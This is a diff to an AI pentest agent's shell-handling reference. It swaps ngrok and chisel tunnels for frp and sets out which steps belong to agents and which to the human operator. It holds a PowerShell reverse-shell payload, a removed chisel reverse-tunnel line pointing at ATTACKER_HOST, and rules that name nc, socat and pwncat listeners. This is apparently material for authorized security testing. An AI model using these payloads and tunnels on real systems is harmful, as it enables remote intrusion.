@@ -2,13 +2,15 @@
 
 ## Architecture
 
-Listeners (pwncat-vl, ngrok, chisel) are OPERATOR-CONTROLLED shared infrastructure.
+Listeners (pwncat-vl) are OPERATOR-CONTROLLED shared infrastructure.
 Agents must never start them. The Kali runtime is shared across engagements — an agent
 starting a listener on port 4444 could conflict with another engagement's listener.
-ngrok tunnels are account-scoped — starting a second tunnel tears down the first.
 
 **Agent responsibility:** provide the exact commands in `# MANUAL:` playbook steps.
-**Operator responsibility:** execute them, then signal the agent to continue.
+**Operator responsibility:** execute them, record tunnel address in `$DIR/.listener_url`, then signal the agent to continue.
+
+For exposing listeners to remote targets via tunnels, see `agent/references/offensive-tactics/frp-tunneling.md`.
+For OOB callback servers (interactsh) and blind vulnerability detection, see `agent/references/offensive-tactics/frp-tunneling.md`.
 
 ## pwncat-vl Listener Commands
 
@@ -41,7 +43,8 @@ docker exec -it security-research tmux new-session -d -s shell-ssh \
 ## tmux Session Management
 
 ### Naming convention
-Sessions are named `shell-<port>` or `shell-<descriptive-tag>`.
+Shell sessions are named `shell-<port>` or `shell-<descriptive-tag>`.
+Tunnel sessions use `frp-<name>` (see `frp-tunneling.md`).
 
 ### Common commands
 ```bash
@@ -72,35 +75,22 @@ cat /data/shell-4444.log        # full log
 ```
 
 Log files under `/data/` persist across tmux restarts because `/data` is the
-engagement volume mount point.
+shared runtime data mount point.
 
 ## Exposing Listeners Externally
 
-### ngrok (installed)
+After starting a pwncat listener, it is only reachable from the local container network.
+To expose it to remote targets, set up an frp tunnel.
+
+**Full tunnel setup commands:** `agent/references/offensive-tactics/frp-tunneling.md`
+
+The `oob-rev` proxy in `/data/frpc.toml` handles this — start frpc and record the address:
 ```bash
-# Expose pwncat listener on port 4444
-docker exec -e NGROK_AUTHTOKEN="$NGROK_AUTHTOKEN" \
-  -it security-research ngrok tcp 4444
-```
-Note the public `host:port` from ngrok output and substitute it in reverse shell payloads.
-
-**ngrok is account-scoped.** Most accounts allow one tunnel at a time. The operator
-must manage tunnel lifecycle — agents must not start or stop ngrok.
-
-### chisel / SSH tunnels / other forwarding (installed)
-
-For detailed chisel, SSH tunnel, NTLM relay, and port forwarding commands, see
-`agent/references/offensive-tactics/lateral-movement/tunneling-relaying.md`.
-
-Quick chisel example for exposing a pwncat listener:
-```bash
-docker exec -it security-research tmux new-session -d -s chisel-server \
-  'chisel server --reverse --port 8080 2>&1 | tee /data/chisel.log'
-# Victim: chisel client ATTACKER_HOST:8080 R:4444:127.0.0.1:4444
+echo "oob-relay.example.com:8443" > "$DIR/.listener_url"
 ```
 
-### frp (not installed)
-frp is not bundled. If the operator needs it, install manually.
+Agents read `LISTENER_HOST` and `LISTENER_PORT` from `$DIR/.listener_url` (or from dispatch context)
+instead of hardcoding tunnel addresses.
 
 ## Reverse Shell Payloads
 
@@ -130,11 +120,6 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LISTENER_HOST',LISTENER
 
 ## Integration with Existing Systems
 
-### HTTP callback listener (`start-callback`)
-The HTTP callback listener is for blind SSRF, OOB, and webhook validation — NOT for
-reverse shells. Use pwncat-vl for reverse shells and `start-callback` for HTTP callbacks.
-They are complementary.
-
 ### Metasploit (optional sidecar)
 MSF remains available for exploit modules (gadget generation, specific CVE exploits).
 For shell handling (catching reverse shells, session management), use pwncat-vl instead.
@@ -145,11 +130,12 @@ when running alongside the primary Kali runtime.
 
 Agents **MUST NOT:**
 - Start `pwncat`, `nc -lvp`, `socat` as a listener, or any listening socket
-- Start `ngrok`, `frp`, or `chisel server`
+- Start frp tunnels or `chisel server`
 - Kill or restart existing listener or tunnel sessions
 
 Agents **CAN:**
 - Read listener log files (`tail /data/shell-*.log`) via Kali MCP
+- Read OOB callback logs (`tail /data/oob-server.log`) via Kali MCP to check for hits
 - Provide reverse shell payloads for the operator to deploy
 - Verify that a shell connected by checking log output
 - Send commands to an established shell via `tmux send-keys` (if operator authorizes)
@@ -157,5 +143,6 @@ Agents **CAN:**
 Agents **MUST:**
 - Mark shell-catching steps as `# MANUAL:` in playbooks
 - Include the full listener commands the operator should run
-- Reference this file (`agent/references/offensive-tactics/shell-handling.md`)
+- Reference this file (`agent/references/offensive-tactics/shell-handling.md`) for listener setup
+- Reference `agent/references/offensive-tactics/frp-tunneling.md` for tunnel and OOB setup
 - Wait for operator confirmation before proceeding past a manual step
